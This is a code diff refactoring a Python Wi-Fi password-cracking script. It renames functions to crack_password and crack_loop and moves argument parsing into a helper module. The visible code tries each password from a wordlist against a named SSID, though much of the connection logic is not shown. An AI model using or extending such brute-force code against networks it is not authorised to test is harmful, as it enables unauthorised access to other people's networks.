@@ -5,7 +5,6 @@
 
 ###############################################################################################################
 # Importing General Libraries
-import argparse
 import logging
 import os, os.path, platform
 import sys
@@ -16,6 +15,8 @@ from pywifi import const
 from pywifi import Profile
 
 import colorama
+
+from helpers.parser import get_argument_parser
 
 colorama.init()
 
@@ -45,7 +46,7 @@ logging.basicConfig(
 
 # type = False
 
-def main(ssid, password, number):
+def crack_password(ssid, password, number):
     profile = Profile()  # create profile instance
     profile.ssid = ssid  # name of client
     profile.auth = const.AUTH_ALG_OPEN  # auth algo
@@ -85,7 +86,7 @@ def main(ssid, password, number):
 
 
 # opening and reading the file
-def pwd(ssid, file):
+def crack_loop(ssid, file):
     print(YELLOW)
     print(TILDE, "Cracking...")
     number = 0
@@ -96,50 +97,18 @@ def pwd(ssid, file):
             pwd = line[0]
             print(GREEN)
             print(f"[{number}] Trying {ssid} with {pwd}")
-            main(ssid, pwd, number)
+            crack_password(ssid, pwd, number)
 
 
 def menu(client_ssid, path_to_file):
-    # Argument Parser for making cmd interative
-    parser = argparse.ArgumentParser(description='argparse Example')
-
-    # adding arguments
-    parser.add_argument(
-        '-s',
-        '--ssid',
-        metavar='',
-        type=str,
-        help='SSID = WIFI Name..',
-        required=True
-    )
-    parser.add_argument(
-        '-w',
-        '--wordlist',
-        metavar='',
-        type=str,
-        help='keywords list ...',
-        required=True
-    )
-
-    print()
-
+    parser = get_argument_parser()
     args = parser.parse_args()
 
     print(DARK_CYAN, "[+] You are using ", BOLD, platform.system(), platform.machine(), "...")
     time.sleep(1.5)
 
-    # taking wordlist and ssid if given else take default
-    # if args.wordlist and args.ssid:
-    #     ssid = args.ssid
-    #     filee = args.wordlist
-    # else:
-    #     print(BLUE)
-    #     # ssid = client_ssid
-    #     # filee = path_to_file
-    #     return None
-
     ssid = args.ssid
-    filee = args.wordlist
+    filee = args.file
 
     # breaking
     if os.path.exists(filee):
@@ -160,7 +129,7 @@ if __name__ == '__main__':
     # Main function call
     ssid, filee = menu(client_ssid="", path_to_file="")
     wifi = helpers.wifi.Wifi()
-    pwd(ssid, filee)
+    crack_loop(ssid, filee)
 
 ###########################################################################################################################################################
 # END OF FILE
